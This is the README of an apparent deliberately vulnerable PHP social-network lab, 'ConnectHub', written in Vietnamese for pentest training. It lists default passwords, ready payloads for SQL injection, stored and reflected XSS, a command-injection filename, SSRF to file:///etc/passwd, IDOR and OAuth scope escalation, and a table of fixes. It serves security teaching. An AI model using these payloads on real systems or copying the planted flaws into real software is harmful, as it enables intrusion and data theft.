# ConnectHub - Vulnerable Social Media Lab

> Canh bao: Day la ung dung co chu dich chua lo hong bao mat de phuc vu hoc tap, demo va kiem thu pentest. Khong deploy len Internet cong khai.

ConnectHub la mang xa hoi mini viet bang PHP 7.4, MySQL 5.7 va Apache. Project co day du cac chuc nang co ban cua social app, dong thoi co cac lo hong OWASP Top 10 duoc cai san de sinh vien co the khai thac, quan sat log va viet bao cao.

## Stack

- PHP 7.4 + Apache
- MySQL 5.7
- Docker / Docker Compose
- Frontend: HTML, CSS, JavaScript thuan

## Chay project

```bash
cd connecthub
docker compose up -d --build
```

Truy cap:

```txt
http://localhost
```

Neu cho ban be trong cung mang vao, lay IPv4 bang:

```powershell
ipconfig
```

Sau do mo:

```txt
http://<IPv4-cua-may-ban>
```

## Tai khoan mac dinh

| Username | Password | Role |
|---|---|---|
| admin | admin123 | Admin |
| alice | alice123 | User |
| bob | bob123 | User |
| charlie | charlie123 | User |

## Chuc nang da co

- Dang ky / dang nhap
- Phan quyen Admin va User
- Trang rieng cho Admin: `admin.php`
- Trang rieng cho User: `user.php`
- User profile va avatar upload
- Gioi tinh nam/nu va avatar mac dinh rieng
- Tao post, comment
- Private post
- Nhan tin rieng
- Friend request
- OAuth login mo phong GitHub/Google
- URL Preview
- Admin moderation: duyet bai, xoa bai, ban/unban user
- Intrusion Detection: ghi log login va payload khai thac

## Trang quan trong

| Trang | Mo ta |
|---|---|
| `/login.php` | Dang nhap, co SQL Injection va weak session |
| `/register.php` | Dang ky user |
| `/user.php` | Dashboard user |
| `/admin.php` | Dashboard admin |
| `/index.php` | Feed, tao post, Stored XSS, private disclosure |
| `/post.php?id=<id>` | Chi tiet post va comment |
| `/profile.php?id=<id>` | Profile user, IDOR/private disclosure |
| `/messages.php?to=<id>` | Nhan tin rieng, IDOR va Stored XSS |
| `/search.php?q=<keyword>` | User search, SQLi va Reflected XSS |
| `/settings.php` | Profile settings, avatar upload, command injection |
| `/preview.php` | URL preview, SSRF |
| `/oauth.php` | OAuth scope escalation |

## Intrusion Detection cua Admin

Vao:

```txt
http://localhost/admin.php#security
```

Admin co the xem:

- Ai dang nhap luc nao
- Dang nhap thanh cong / that bai
- IP cua request
- Payload SQL Injection
- Payload XSS
- Payload SSRF
- Payload command injection
- OAuth scope escalation

Thoi gian log dung timezone:

```txt
Asia/Ho_Chi_Minh (UTC+7)
```

Nut `Mark reviewed` chi danh dau da xem, khong xoa log.

## Danh sach lo hong va cach kiem thu

Chi kiem thu trong moi truong lab/local cua ban.

### 1. SQL Injection - Login

Vao:

```txt
http://localhost/login.php
```

Nhap:

```txt
Username: admin' AND 1=1 #
Password: anything
```

Ket qua mong doi: bypass dang nhap vao admin.

### 2. SQL Injection - User Search

Dang nhap user bat ky, vao:

```txt
http://localhost/search.php?q=' UNION SELECT 1,username,password,email,'default-male.svg' FROM users-- -
```

Ket qua mong doi: lay duoc username, password hash va email trong ket qua search.

### 3. Reflected XSS - Search

Vao:

```txt
http://localhost/search.php?q="><script>alert(document.cookie)</script>
```

Ket qua mong doi: browser hien alert cookie.

### 4. Stored XSS - Post

Dang nhap user, vao feed va tao post:

```html
<script>alert(document.cookie)</script>
```

Hoac:

```html
<img src=x onerror=alert(document.cookie)>
```

Ket qua mong doi: khi mo feed/post, script duoc thuc thi.

### 5. Stored XSS - Comment

Vao mot post bat ky va comment:

```html
<img src=x onerror=alert(document.cookie)>
```

Ket qua mong doi: ai mo post do se bi chay XSS.

### 6. Stored XSS - Private Message

Vao messages va gui:

```html
<img src=x onerror=alert(document.cookie)>
```

Ket qua mong doi: nguoi nhan mo chat se bi chay XSS.

### 7. Private Posts Disclosure

Dang nhap `bob`, vao:

```txt
http://localhost/profile.php?id=2
```

`id=2` la Alice.

Ket qua mong doi: thay ca private post cua Alice.

### 8. Private Messages Disclosure / IDOR

Dang nhap `charlie`, thu:

```txt
http://localhost/messages.php?to=2
```

Hoac API:

```txt
http://localhost/api/get_messages.php?to=2&last_id=0
```

Ket qua mong doi: co the truy cap conversation bang cach doi ID.

### 9. Weak Session / Session Hijacking

Buoc test:

1. Tao Stored XSS de doc cookie:

```html
<script>alert(document.cookie)</script>
```

2. Copy cookie `CONNECTHUB_SESSION`.
3. Mo trinh duyet khac hoac tab an danh.
4. Them/sua cookie `CONNECTHUB_SESSION`.
5. Refresh trang.

Ly do khai thac duoc:

- Session cookie khong bat `HttpOnly`
- Cookie khong bat `Secure`
- Remember token tao bang `MD5(username + time())`

### 10. Command Injection - Avatar Upload

Vao:

```txt
http://localhost/settings.php
```

Doi ten file anh thanh:

```txt
pwned.jpg'; id; echo '
```

Hoac:

```txt
pwned.jpg'; whoami; echo '
```

Upload avatar.

Ket qua mong doi: output cua `exiftool` co ket qua lenh he thong.

### 11. Avatar Upload Bypass

Vao Settings va upload file khong phai anh, vi du:

```txt
test.txt
```

Ket qua mong doi: he thong van chap nhan file vi khong validate MIME/extension chat che.

### 12. SSRF - URL Preview

Vao:

```txt
http://localhost/preview.php
```

Nhap:

```txt
file:///etc/passwd
```

Hoac:

```txt
http://127.0.0.1/admin.php
```

Hoac:

```txt
http://localhost/login.php
```

Ket qua mong doi: server fetch noi dung local/internal.

### 13. OAuth Scope Escalation

Vao:

```txt
http://localhost/oauth.php?provider=github&simulate=1&scope=admin
```

Hoac tren UI OAuth, chon scope:

```txt
admin
```

Ket qua mong doi: server chap nhan scope client gui len ma khong validate.

## Yeu cau ky thuat da dap ung

| Yeu cau | Trang/File | Trang thai |
|---|---|---|
| User profiles voi avatar upload | `profile.php`, `settings.php` | Co |
| Post/comment functionality | `index.php`, `post.php` | Co |
| Private messaging | `messages.php`, `api/get_messages.php`, `api/send_message.php` | Co |
| Friend request system | `friends.php` | Co |
| OAuth integration | `oauth.php` | Co |
| Private posts/messages disclosure | `index.php`, `profile.php`, `messages.php` | Co |
| Session hijacking / weak session | `includes/db.php`, `login.php` | Co |
| IDOR doc tin nhan nguoi khac | `messages.php`, `api/get_messages.php` | Co |
| OAuth scope escalation | `oauth.php` | Co |
| SQL Injection trong user search | `search.php` | Co |
| Command Injection qua image metadata | `settings.php` | Co |
| Reflected XSS | `search.php` | Co |
| Stored XSS | `index.php`, `post.php`, `messages.php`, `profile.php` | Co |
| SSRF qua URL preview | `preview.php` | Co |
| Avatar upload bypass | `settings.php` | Co |

## Fix goi y cho bao cao

Neu can viet phan khac phuc trong bao cao, co the de xuat:

| Lo hong | Huong fix |
|---|---|
| SQL Injection | Dung prepared statement |
| XSS | Escape output bang `htmlspecialchars`, sanitize input neu can |
| IDOR | Check ownership/authorization moi request |
| Private disclosure | Loc `is_private=0 OR user_id=$_SESSION['user_id']` |
| Weak session | Bat `HttpOnly`, `Secure`, `SameSite`, token random bang `random_bytes` |
| Command Injection | Khong ghep filename vao shell command, dung `escapeshellarg`, whitelist extension |
| SSRF | Whitelist domain/scheme, chan `file://`, `127.0.0.1`, metadata IP |
| OAuth escalation | Validate scope server-side, them `state`, khong tin scope tu client |
| Avatar bypass | Check MIME bang `finfo`, whitelist extension, rename file random |

## Cau truc project

```txt
connecthub/
├── docker-compose.yml
├── Dockerfile
├── init.sql
├── README.md
└── app/
    ├── admin.php
    ├── user.php
    ├── index.php
    ├── login.php
    ├── register.php
    ├── profile.php
    ├── messages.php
    ├── search.php
    ├── settings.php
    ├── preview.php
    ├── oauth.php
    ├── friends.php
    ├── post.php
    ├── includes/
    │   ├── db.php
    │   ├── header.php
    │   ├── footer.php
    │   └── security.php
    ├── api/
    ├── css/
    ├── js/
    └── uploads/
```

## Ghi chu

- Project uu tien muc tieu lab, nen mot so code co chu dich khong an toan.
- Admin Intrusion Detection chi ghi nhan va hien thi payload, khong chan khai thac.
- Khong dua project nay len server public neu chua fix cac lo hong.
